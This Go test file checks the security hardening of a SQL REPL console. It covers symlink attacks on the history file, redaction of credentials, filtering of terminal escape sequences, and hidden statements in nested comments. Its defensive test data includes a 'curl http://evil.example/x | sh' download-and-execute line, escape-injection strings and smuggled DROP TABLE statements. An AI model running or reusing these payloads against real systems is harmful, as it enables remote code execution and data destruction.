package repl

import (
	"database/sql"
	"os"
	"path/filepath"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/SandwichLabs/slaw/internal/engine"
	"github.com/SandwichLabs/slaw/internal/lsp"
	"github.com/SandwichLabs/slaw/internal/queries"
)

// B1: a committed symlink at .slaw-local/repl/history must not make the console
// write (or truncate) a file outside the workspace.
func TestHistorySymlinkedFileIsNotFollowed(t *testing.T) {
	base := t.TempDir()
	root := filepath.Join(base, "ws")
	outside := filepath.Join(base, "bashrc")
	require.NoError(t, os.WriteFile(outside, []byte("# rc\n"), 0o644))
	require.NoError(t, os.MkdirAll(filepath.Join(root, ".slaw-local", "repl"), 0o755))
	require.NoError(t, os.Symlink("../../../bashrc", historyPath(root)))
	store := queries.NewFileStore(root)
	require.NoError(t, store.Create(t.Context(), &queries.Query{Title: "evil", SQL: "SELECT 1;\ncurl http://evil.example/x | sh;", Parameters: []queries.Param{}}))

	f := newSession(t, func(o *Options) { o.Root = root; o.Queries = store })
	f.waitFor(prompt)
	assert.Contains(t, f.out.String(), "History is off: ")
	f.run(".read evil\r")
	require.NoError(t, f.s.Close())

	data, err := os.ReadFile(outside)
	require.NoError(t, err)
	assert.Equal(t, "# rc\n", string(data), "the link's target is untouched")
}

func TestHistorySymlinkedFileIsNotTruncatedAtOpen(t *testing.T) {
	base := t.TempDir()
	root := filepath.Join(base, "ws")
	outside := filepath.Join(base, "bash_history")
	var long strings.Builder
	for i := 0; i < historyMax+100; i++ {
		long.WriteString("ls\n")
	}
	require.NoError(t, os.WriteFile(outside, []byte(long.String()), 0o600))
	require.NoError(t, os.MkdirAll(filepath.Dir(historyPath(root)), 0o700))
	require.NoError(t, os.Symlink(outside, historyPath(root)))
	h, notice := openHistory(root)
	assert.NotEmpty(t, notice)
	assert.Empty(t, h.path)
	data, err := os.ReadFile(outside)
	require.NoError(t, err)
	assert.Equal(t, long.String(), string(data))
}

func TestHistorySymlinkedDirectoryIsNotFollowed(t *testing.T) {
	base := t.TempDir()
	root := filepath.Join(base, "ws")
	elsewhere := filepath.Join(base, "elsewhere")
	require.NoError(t, os.MkdirAll(elsewhere, 0o755))
	require.NoError(t, os.MkdirAll(filepath.Join(root, ".slaw-local"), 0o755))
	require.NoError(t, os.Symlink(elsewhere, filepath.Join(root, ".slaw-local", "repl")))
	h, notice := openHistory(root)
	assert.NotEmpty(t, notice)
	h.record("SELECT 1")
	entries, err := os.ReadDir(elsewhere)
	require.NoError(t, err)
	assert.Empty(t, entries, "nothing was created through the link")

	// A link at .slaw-local itself too.
	root2 := filepath.Join(base, "ws2")
	require.NoError(t, os.MkdirAll(root2, 0o755))
	require.NoError(t, os.Symlink(elsewhere, filepath.Join(root2, ".slaw-local")))
	_, notice = openHistory(root2)
	assert.NotEmpty(t, notice)
	entries, _ = os.ReadDir(elsewhere)
	assert.Empty(t, entries)
}

func TestHistoryFailureStillOpensTheConsole(t *testing.T) {
	root := t.TempDir()
	require.NoError(t, os.MkdirAll(historyPath(root), 0o700)) // a directory where the file should be
	f := newSession(t, withRoot(root))
	f.waitFor(prompt)
	assert.Equal(t, 1, strings.Count(f.out.String(), "History is off"))
	f.run("select 1;\r")
}

// S9: modes on an existing file and folder are tightened.
func TestHistoryExistingLooseModeIsTightened(t *testing.T) {
	root := t.TempDir()
	dir := filepath.Dir(historyPath(root))
	require.NoError(t, os.MkdirAll(dir, 0o755))
	require.NoError(t, os.Chmod(dir, 0o755))
	require.NoError(t, os.WriteFile(historyPath(root), []byte("SELECT 1\n"), 0o644))
	require.NoError(t, os.Chmod(historyPath(root), 0o644))
	_, notice := openHistory(root)
	require.Empty(t, notice)
	fi, err := os.Stat(historyPath(root))
	require.NoError(t, err)
	assert.Equal(t, os.FileMode(0o600), fi.Mode().Perm())
	di, err := os.Stat(dir)
	require.NoError(t, err)
	assert.Equal(t, os.FileMode(0o700), di.Mode().Perm())
}

// B2: credentials in a dot command or in SQL literals never reach history, and
// .save never offers them.
func TestCredentialStatementsAreNotRecordableOrSavable(t *testing.T) {
	for _, text := range []string{
		"SELECT * FROM postgres_scan('host=h password=hunter2', 'public', 't')",
		"SELECT * FROM postgres_query('host=h user=u password=hunter2', 'select 1')",
		"FROM read_parquet('s3://b/k?s3_secret_access_key=AKIASECRET2')",
		".open md:?motherduck_token=SEKRETTOKEN1",
		"SELECT 'https://user:pw12345@host/x'",
	} {
		assert.False(t, engine.Recordable(foldEntry(text)), text)
	}
	assert.True(t, engine.Recordable("SELECT 1"))
	assert.True(t, engine.Recordable(".mode csv"))

	store := queries.NewFileStore(t.TempDir())
	f := newSession(t, func(o *Options) { o.Queries = store })
	f.waitFor(prompt)
	f.run("select 1 as ok;\r")
	f.run("select * from nope_scan('host=h password=hunter2');\r") // fails to run
	f.run("select 'password=hunter2' as p;\r")                     // runs
	f.output(".save kept")
	all, err := store.List(t.Context())
	require.NoError(t, err)
	require.Len(t, all, 1)
	assert.Equal(t, "select 1 as ok", all[0].SQL)
	assert.NotContains(t, all[0].SQL, "hunter2")
}

// B3: no entry with a control character is recorded, loaded, or replayed.
func TestHistoryNeverReplaysControlCharacters(t *testing.T) {
	root := t.TempDir()
	require.NoError(t, os.MkdirAll(filepath.Dir(historyPath(root)), 0o700))
	require.NoError(t, os.WriteFile(historyPath(root),
		[]byte("SELECT '\x1b]0;pwned\x07\x1b[2J'\nSELECT '\u009b2J'\nSELECT 'ok'\n"), 0o600))
	f := newSession(t, withRoot(root))
	f.waitFor(prompt)
	mark := len(f.out.String())
	f.typ("\x1b[A\x1b[A\x1b[A")
	time.Sleep(200 * time.Millisecond)
	got := f.out.String()[mark:]
	assert.NotContains(t, got, "\x1b]0;")
	assert.NotContains(t, got, "\x1b[2J")
	assert.NotContains(t, got, "\u009b")
	assert.Contains(t, got, "SELECT 'ok'")
	h, _ := openHistory(root)
	assert.Equal(t, []string{"SELECT 'ok'"}, h.entries, "bad lines are dropped on load")
	data, _ := os.ReadFile(historyPath(root))
	assert.Equal(t, "SELECT 'ok'\n", string(data), "and the file is cleaned")

	// A query that makes a statement holding an ESC runs, but is not recorded.
	store := queries.NewFileStore(t.TempDir())
	require.NoError(t, store.Create(t.Context(), &queries.Query{Title: "esc", SQL: "SELECT '\x1b]0;pwned\x07' AS x;", Parameters: []queries.Param{}}))
	g := newSession(t, func(o *Options) { o.Root = root; o.Queries = store })
	g.waitFor(prompt)
	g.run(".read esc\r")
	require.NoError(t, g.s.Close())
	data, _ = os.ReadFile(historyPath(root))
	assert.NotContains(t, string(data), "\x1b")
	assert.NotContains(t, string(data), "pwned")

	assert.NotContains(t, termHistory{&history{entries: []string{"SELECT 'x\x1b[2J'"}}}.At(0), "\x1b", "At is the last guard")
	assert.NotContains(t, termHistory{&history{entries: []string{"\x1b[2J"}}}.At(0), "\x1b")
}

// B4: the console and DuckDB agree on what is a comment or a string.
func TestNestedCommentAndNonASCIITagDoNotRunHiddenCode(t *testing.T) {
	f := newSession(t, nil)
	f.waitFor(prompt)
	f.run("CREATE TABLE keep(x INT);\r")
	f.run("/* x /* y */ ; DROP TABLE keep; /* z */ */ SELECT 1;\r")
	f.run("SELECT $é$ ; DROP TABLE keep; $é$ AS s;\r")
	f.run("SELECT count(*) AS n FROM keep;\r")
	assert.NotContains(t, f.out.String(), "Error:")
	assert.Contains(t, f.out.String(), "│     0 │", "keep survived")
}

// Differential: the same script run whole by DuckDB and piece by piece after
// lsp.Split leaves the same tables behind.
func TestSplitAgreesWithDuckDB(t *testing.T) {
	scripts := []string{
		"CREATE TABLE a(x INT); CREATE TABLE b(x INT);",
		"/* x /* y */ ; CREATE TABLE no(x INT); /* z */ */ CREATE TABLE yes(x INT);",
		"CREATE TABLE t1 AS SELECT $é$ ; CREATE TABLE no(x INT); $é$ AS s; CREATE TABLE t2(x INT);",
		"CREATE TABLE t1 AS SELECT $$;$$ AS s; CREATE TABLE t2 AS SELECT E'it\\'s;' AS s;",
		"CREATE TABLE t1 AS SELECT 'a;b' AS s; -- ; CREATE TABLE no(x INT);\nCREATE TABLE t2(x INT);",
		"CREATE TABLE \"we;ird\"(x INT); CREATE TABLE t2(x INT);",
		"CREATE TABLE t1 AS SELECT $t$ $u$; $u$ ; $t$ AS s; CREATE TABLE t2(x INT);",
		"/* ; */ CREATE TABLE t1(x INT) /* a /* ; */ ; */; CREATE TABLE t2(x INT);",
		"CREATE TABLE t1 AS SELECT 'it''s;' AS s; CREATE TABLE t2(x INT);",
	}
	tables := func(db *sql.DB) string {
		rows, err := db.Query("SELECT table_name FROM duckdb_tables() ORDER BY 1")
		require.NoError(t, err)
		defer rows.Close() //nolint:errcheck
		var names []string
		for rows.Next() {
			var n string
			require.NoError(t, rows.Scan(&n))
			names = append(names, n)
		}
		return strings.Join(names, ",")
	}
	for _, script := range scripts {
		whole, err := sql.Open("duckdb", "")
		require.NoError(t, err)
		_, _ = whole.Exec(script) // an error mid-script is part of the comparison
		split, err := sql.Open("duckdb", "")
		require.NoError(t, err)
		stmts, rest, _ := lsp.Split(script)
		if rest != "" {
			stmts = append(stmts, rest)
		}
		for _, st := range stmts {
			_, _ = split.Exec(st)
		}
		assert.Equal(t, tables(whole), tables(split), script)
		_ = whole.Close()
		_ = split.Close()
	}
}

// S1: an Exit hook that closes the session (Studio closing the tab) must not
// deadlock.
func TestExitHookThatClosesDoesNotDeadlock(t *testing.T) {
	var f *fixture
	var called atomic.Int32
	closed := make(chan struct{})
	f = newHub(t)
	require.NoError(t, f.open(func(o *Options) {
		o.Hooks.Exit = func() {
			called.Add(1)
			_ = f.s.Close()
			close(closed)
		}
	}))
	f.waitFor(prompt)
	f.typ(".exit\r")
	select {
	case <-closed:
	case <-time.After(5 * time.Second):
		t.Fatal("Exit calling Close deadlocked")
	}
	assert.EqualValues(t, 1, called.Load())
}

// S2: what the person types or pastes is cleaned before the editor echoes it.
func TestInputIsCleanedBeforeTheEditorEchoesIt(t *testing.T) {
	f := newSession(t, nil)
	f.waitFor(prompt)
	mark := len(f.out.String())
	f.typ("\x1b[200~SELECT '\x1b]0;pwned\x07\x1b[2J\u009b2J‮abc' AS v\x1b[201~")
	f.typ("\u009b‮")
	time.Sleep(200 * time.Millisecond)
	got := f.out.String()[mark:]
	assert.NotContains(t, got, "\x07")
	assert.NotContains(t, got, "\x1b]")
	assert.NotContains(t, got, "\x1b[2J")
	assert.NotContains(t, got, "\u009b")
	assert.NotContains(t, got, "‮")
	assert.Contains(t, got, "]0;pwned")

	// Arrow keys and the paste markers still work.
	f.typ(";\r")
	f.waitCount(prompt, 2)
}

func TestFilterHandlesSplitSequences(t *testing.T) {
	var flt inputFilter
	// A paste marker and a C1 character split across calls.
	out := flt.apply([]byte("\x1b[20"))
	out = append(out, flt.apply([]byte("0~a\x07\x1b"))...)
	out = append(out, flt.apply([]byte("[2Jb\xc2"))...)
	out = append(out, flt.apply([]byte("\x9bc\x1b[201~d\x1b[Ae"))...)
	assert.Equal(t, "\x1b[200~a[2Jbc\x1b[201~d\x1b[Ae", string(out))

	var flt2 inputFilter
	out = flt2.apply([]byte("x\xee\x80"))
	out = append(out, flt2.apply([]byte("\x80y"))...) // U+E000 split across calls
	assert.Equal(t, "xy", string(out))
}

// S3: Ctrl+C on a runaway paste also drops what was typed ahead.
func TestCtrlCDropsQueuedStatements(t *testing.T) {
	f := newSession(t, nil)
	f.waitFor(prompt)
	f.run("CREATE TABLE z(x INT);\r")
	f.typ("SELECT count(*) FROM range(3000000000), range(1000);\rINSERT INTO z VALUES (1);\rINSERT INTO z VALUES (2);\r")
	f.waitRunning()
	require.NoError(t, f.s.Input([]byte{0x03}))
	f.waitCount(prompt, 3)
	time.Sleep(300 * time.Millisecond)
	f.run("SELECT count(*) AS n FROM z;\r")
	assert.Contains(t, f.out.String(), "│     0 │")
}

func TestCtrlCDropsTheRestOfOneLine(t *testing.T) {
	f := newSession(t, nil)
	f.waitFor(prompt)
	f.run("CREATE TABLE z(x INT);\r")
	f.typ("SELECT count(*) FROM range(3000000000), range(1000); INSERT INTO z VALUES (1);\r")
	f.waitRunning()
	require.NoError(t, f.s.Input([]byte{0x03}))
	f.waitCount(prompt, 3)
	f.run("SELECT count(*) AS n FROM z;\r")
	assert.Contains(t, f.out.String(), "│     0 │")
}

// S4: DDL and DML print nothing, as DuckDB's CLI does.
func TestDDLAndDMLPrintNothing(t *testing.T) {
	goldenSession(t, "ddl_dml", func(f *fixture) {
		f.run("create table t(x int);\r")
		f.run("insert into t values (1), (2);\r")
		f.run("insert into t values (3) returning x;\r")
		f.run("update t set x = x + 1;\r")
		f.run("delete from t where x = 2;\r")
		f.run("drop table t;\r")
	})
}

// S6 (console half): the queue fills, refuses, and takes input again once the
// editor reads.
func TestInputOverflowRecovers(t *testing.T) {
	f := newSession(t, nil)
	f.waitFor(prompt)
	f.typ(longQuery)
	f.waitRunning()
	chunk := []byte(strings.Repeat("a", MaxInput))
	var err error
	for i := 0; i < 5 && err == nil; i++ {
		err = f.s.Input(chunk)
	}
	require.ErrorIs(t, err, ErrInputOverflow)
	require.NoError(t, f.s.Input([]byte{0x03})) // cancels and flushes the queue
	f.waitCount(prompt, 2)
	require.NoError(t, f.s.Input([]byte("select 7;\r")))
	f.waitCount(prompt, 3)
}

// S7: a hand-typed USE gives the connection that catalog's settings.
func TestTypedUseFollowsTheCatalog(t *testing.T) {
	f := newHub(t)
	f.lazyFile("other")
	require.NoError(t, f.open(nil))
	f.waitFor(prompt)
	f.output(".conn other")
	f.run("use memory;\r")
	assert.Equal(t, "memory", f.s.Current())
	assert.Equal(t, "", f.s.ConnCatalog())
	f.run("use other;\r")
	assert.Equal(t, "other", f.s.Current())
	assert.Equal(t, "other", f.s.ConnCatalog())
}

// S8: a number is never wrapped.
func TestNumbersAreNotWrapped(t *testing.T) {
	var out string
	for _, rc := range renderCases()["duckbox"] {
		if rc.name == "types" {
			out = renderToString(t, rc, false)
		}
	}
	assert.Contains(t, out, "9007199254740993")
}

// Nit 3: a hostile LIKE pattern is linear.
func TestLikeMatchIsLinear(t *testing.T) {
	start := time.Now()
	assert.False(t, likeMatch(strings.Repeat("%a", 40)+"b", strings.Repeat("a", 2000)))
	assert.Less(t, time.Since(start), time.Second)
}

// Nit 2: a failed start leaves the terminal as it found it.
func TestFailedStartWritesNoBracketedPasteSwitch(t *testing.T) {
	f := newHub(t)
	err := f.open(func(o *Options) { o.Connection = "nope" })
	require.Error(t, err)
	assert.NotContains(t, f.out.String(), "\x1b[?2004h")
}

// R2-1: a Ctrl+C that flushes the end of a multi-line paste must not leave the
// editor in paste mode.
func TestPasteThenCtrlCLeavesEditorUsable(t *testing.T) {
	f := newSession(t, nil)
	f.waitFor(prompt)
	f.typ("\x1b[200~SELECT count(*) FROM range(3000000000), range(1000);\rSELECT 11;\rSELECT 12;\r\x1b[201~")
	f.waitRunning()
	require.NoError(t, f.s.Input([]byte{0x03}))
	f.waitCount(prompt, 2)
	f.typ("SELECT 4x\x7f2 AS v;\r") // a typo fixed with backspace: normal editing
	f.waitCount(prompt, 3)
	assert.Contains(t, f.out.String(), "│    42 │")
	assert.NotContains(t, f.out.String(), "│    11 │")
	require.NoError(t, f.s.Input([]byte{0x04}))
	select {
	case <-f.s.Done():
	case <-time.After(5 * time.Second):
		t.Fatal("Ctrl+D does not exit after a cancelled paste")
	}
}

func TestRefusedInputDoesNotAdvanceTheFilter(t *testing.T) {
	f := newSession(t, nil)
	f.waitFor(prompt)
	f.typ(longQuery)
	f.waitRunning()
	require.NoError(t, f.s.Input([]byte(strings.Repeat("a", MaxInput))))
	require.NoError(t, f.s.Input([]byte(strings.Repeat("a", MaxInput))))
	require.NoError(t, f.s.Input([]byte(strings.Repeat("a", MaxInput))))
	require.NoError(t, f.s.Input([]byte(strings.Repeat("a", MaxInput-1))))
	err := f.s.Input([]byte("ab\x1b[20")) // the ESC[20 would be stashed as half a paste marker
	require.ErrorIs(t, err, ErrInputOverflow)
	assert.Empty(t, f.s.flt.snapshot().carry)
}

func TestReturningColumnNamedCountIsShown(t *testing.T) {
	f := newSession(t, nil)
	f.waitFor(prompt)
	f.run("CREATE TABLE c(count INT);\r")
	f.run("INSERT INTO c VALUES (5) RETURNING count;\r")
	assert.Contains(t, f.out.String(), "│     5 │")
}
